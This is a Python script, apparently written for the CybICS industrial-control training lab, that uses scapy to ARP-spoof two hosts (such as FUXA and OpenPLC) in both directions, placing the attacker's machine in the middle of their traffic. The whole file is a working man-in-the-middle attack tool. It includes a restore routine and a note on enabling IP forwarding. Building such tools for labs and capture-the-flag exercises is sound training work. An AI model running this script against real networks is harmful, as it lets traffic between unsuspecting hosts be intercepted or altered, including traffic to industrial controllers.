#!/usr/bin/env python3
"""
Minimal two-way ARP spoofer for the CybICS man-in-the-middle challenge.

A scapy stand-in for running arpspoof twice: it tells host A that host B's IP
belongs to this machine's MAC address, and host B the same about host A, every
couple of seconds.  On Ctrl-C it sends the real mappings again so both ARP
caches recover.

The attacker must forward the intercepted packets, or the two hosts lose each
other.  In the CybICS attack shell IP forwarding is already switched on (the
container cannot change it itself); elsewhere run
`echo 1 > /proc/sys/net/ipv4/ip_forward` first.

Example, between FUXA and OpenPLC:
  python3 arp_spoof.py 172.18.0.4 172.18.0.3
"""
import argparse
import sys
import time

from scapy.layers.l2 import ARP, Ether, getmacbyip
from scapy.sendrecv import sendp
from scapy.arch import get_if_hwaddr
from scapy.config import conf


def resolve(ip):
    mac = getmacbyip(ip)
    if not mac:
        sys.exit(f"Cannot resolve the MAC address of {ip}; is it up and on this network?")
    return mac


def tell(target_ip, target_mac, claimed_ip, claimed_mac, iface):
    """Send target an ARP reply saying claimed_ip is at claimed_mac."""
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=claimed_ip, hwsrc=claimed_mac)
    sendp(pkt, iface=iface, verbose=False)


def main():
    parser = argparse.ArgumentParser(description="Two-way ARP spoofing between two hosts")
    parser.add_argument("host_a", help="first victim, e.g. 172.18.0.4 (FUXA)")
    parser.add_argument("host_b", help="second victim, e.g. 172.18.0.3 (OpenPLC)")
    parser.add_argument("-i", "--iface", default=None, help="interface (default: scapy's route)")
    parser.add_argument("--interval", type=float, default=2.0, help="seconds between rounds")
    args = parser.parse_args()

    iface = args.iface or conf.iface
    own_mac = get_if_hwaddr(iface)
    mac_a = resolve(args.host_a)
    mac_b = resolve(args.host_b)
    print(f"{args.host_a} is at {mac_a}, {args.host_b} is at {mac_b}")
    print(f"Claiming both for {own_mac} on {iface}, Ctrl-C to stop and restore")

    rounds = 0
    try:
        while True:
            tell(args.host_a, mac_a, args.host_b, own_mac, iface)
            tell(args.host_b, mac_b, args.host_a, own_mac, iface)
            rounds += 1
            print(f"\rpoisoned both ways, round {rounds}", end="", flush=True)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\nRestoring the ARP caches")
        for _ in range(3):
            tell(args.host_a, mac_a, args.host_b, mac_b, iface)
            tell(args.host_b, mac_b, args.host_a, mac_a, iface)
            time.sleep(0.5)
    return 0


if __name__ == "__main__":
    sys.exit(main())
